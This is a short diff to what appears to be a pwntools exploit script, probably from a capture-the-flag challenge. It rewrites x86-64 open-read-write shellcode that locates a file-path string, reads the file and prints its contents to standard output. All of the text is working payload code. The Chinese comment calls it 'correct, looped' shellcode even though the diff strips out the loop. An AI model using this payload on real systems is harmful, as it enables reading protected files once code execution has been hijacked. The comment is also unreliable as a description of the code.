@@ -14,51 +14,33 @@ context.endian = "little"
 
 # 正確的、帶迴圈的 75 位元組 shellcode
 shellcode_assembly = """
-    jmp short string_data_marker
+jmp short string_data_marker
+
 code_logic_marker:
     pop rbp
     mov rdi, rbp
     xor rsi, rsi
     xor rdx, rdx
-    push 2
-    pop rax
+    mov rax, 2
     syscall
 
     mov rdi, rax
     lea rsi, [rbp + 6]
-    push 25
-    pop rdx
+    mov rdx, 64
 
-read_loop:
-    push 0
-    pop rax
+read:
+    mov rax, 0
     syscall
-
-    test rax, rax
-    jle short exit_sequence
-
-    push rdi
-    push rsi
-    push rdx
 
     mov rdx, rax
-    push 1
-    pop rdi
+    mov rdi, 1
 
-    push 1
-    pop rax
+    mov rax, 1
     syscall
-
-    pop rdx
-    pop rsi
-    pop rdi
-
-    jmp short read_loop
 
 exit_sequence:
     xor rdi, rdi
-    push 60
-    pop rax
+    mov rax, 60
     syscall
 
 string_data_marker:
